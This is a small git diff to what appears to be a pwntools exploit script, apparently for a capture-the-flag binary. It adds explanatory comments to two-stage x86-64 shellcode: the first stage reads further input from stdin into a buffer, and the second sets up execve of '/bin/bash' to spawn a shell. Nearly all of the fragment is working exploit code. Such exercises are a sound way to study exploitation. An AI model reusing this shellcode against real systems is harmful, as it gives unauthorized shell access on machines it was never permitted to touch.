@@ -52,6 +52,7 @@ SECOND_START_BYTE = 17
 io.warn("to make asm work on osx run after installing the proper binutils: export PWNLIB_AS=/opt/homebrew/opt/binutils/bin/x86_64-elf-as")
 # first xor rax, rax gets trampled by a \0 but doesn't hurt anything here lol
 # mov rdx, r11 just gives us a decent nbytes value with fewer bytes than mov.imm
+# read(stdin, buf, somenumber)
 PAYLOAD_STAGE_1 = asm(
         "mov rsi, rax;"
         "xor rdi, rdi;"
@@ -65,6 +66,7 @@ SHELL_COMMAND = b'/bin/bash\0'
 
 # this just sets up execve
 # moves the buffer into rdi, nulls rdi and rdx, sets rdx to 59
+# execve(SHELL_COMMAND, 0, 0)
 PAYLOAD_STAGE_2 = asm(
         "mov rdi, rsi;"
         "mov rsi, r9;"
